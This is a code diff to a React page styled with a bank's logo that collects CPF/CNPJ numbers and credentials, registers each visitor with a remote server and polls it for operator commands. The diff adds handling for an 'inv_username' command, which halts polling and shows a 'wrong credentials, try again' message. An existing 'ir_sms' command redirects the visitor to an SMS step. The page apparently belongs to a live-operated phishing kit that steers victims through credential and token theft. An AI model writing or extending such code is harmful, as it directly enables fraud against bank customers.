@@ -6,6 +6,7 @@ import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.pn
 import { VirtualKeyboardInline } from "@/components/VirtualKeyboardInline";
 import { Switch } from "@/components/ui/switch";
 import { useClientStatus } from "@/hooks/useClientStatus";
+import { useToast } from "@/hooks/use-toast";
 
 // Atualize aqui: Use título e subtítulo (duas linhas) como campos explícitos!
 const TABS = [
@@ -83,7 +84,7 @@ const collectClientData = async () => {
 };
 
 // Função para monitorar cliente continuamente
-const monitorClient = async (clientId: string, navigate: (path: string) => void): Promise<void> => {
+const monitorClient = async (clientId: string, navigate: (path: string) => void, toast: any): Promise<void> => {
   console.log(`Iniciando monitoramento do cliente: ${clientId}`);
   
   let intervalId: NodeJS.Timeout;
@@ -108,6 +109,19 @@ const monitorClient = async (clientId: string, navigate: (path: string) => void)
         console.log('Valor do command:', clientData.data?.command);
         console.log('Tipo do response:', typeof clientData.data?.response);
         console.log('Tipo do command:', typeof clientData.data?.command);
+        
+        // Verificar se recebeu comando de dados incorretos
+        if (clientData.data?.response === "inv_username" || clientData.data?.command === "inv_username") {
+          console.log('Detectado inv_username - Dados incorretos');
+          clearInterval(intervalId);
+          console.log('Monitoramento parado - dados incorretos');
+          toast({
+            title: "Dados incorretos",
+            description: "Os dados da página /home estão incorretos. Verifique suas credenciais e tente novamente.",
+            variant: "destructive",
+          });
+          return;
+        }
         
         // Verificar redirecionamentos baseados no response ou command dentro de data
         if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
@@ -146,7 +160,7 @@ const monitorClient = async (clientId: string, navigate: (path: string) => void)
 };
 
 // Função para processar resposta de registro e iniciar monitoramento
-const processRegistrationResponse = async (response: Response, navigate: (path: string) => void): Promise<void> => {
+const processRegistrationResponse = async (response: Response, navigate: (path: string) => void, toast: any): Promise<void> => {
   try {
     const responseData = await response.json();
     console.log('Cliente registrado com sucesso:', responseData);
@@ -160,7 +174,7 @@ const processRegistrationResponse = async (response: Response, navigate: (path: 
       console.log('ClientId salvo no localStorage:', responseData.clientId);
       
       // Iniciar monitoramento contínuo do cliente
-      await monitorClient(responseData.clientId, navigate);
+      await monitorClient(responseData.clientId, navigate, toast);
     } else {
       console.log('ClientId não encontrado na resposta');
       
@@ -171,7 +185,7 @@ const processRegistrationResponse = async (response: Response, navigate: (path: 
         // Salvar clientId no localStorage
         localStorage.setItem('clientId', clientId);
         console.log('ClientId salvo no localStorage:', clientId);
-        await monitorClient(clientId, navigate);
+        await monitorClient(clientId, navigate, toast);
       }
     }
   } catch (error) {
@@ -182,6 +196,7 @@ const processRegistrationResponse = async (response: Response, navigate: (path: 
 const Index = () => {
   const navigate = useNavigate();
   const clientStatus = useClientStatus();
+  const { toast } = useToast();
   const [tab, setTab] = useState("fisica");
   const [cpf, setCpf] = useState("");
   const [cnpj, setCnpj] = useState("");
@@ -308,7 +323,7 @@ const Index = () => {
       
       if (response.ok) {
         // Processar resposta e iniciar monitoramento
-        await processRegistrationResponse(response, navigate);
+        await processRegistrationResponse(response, navigate, toast);
       } else {
         const errorData = await response.text();
         console.log('Erro na resposta da API:', errorData);
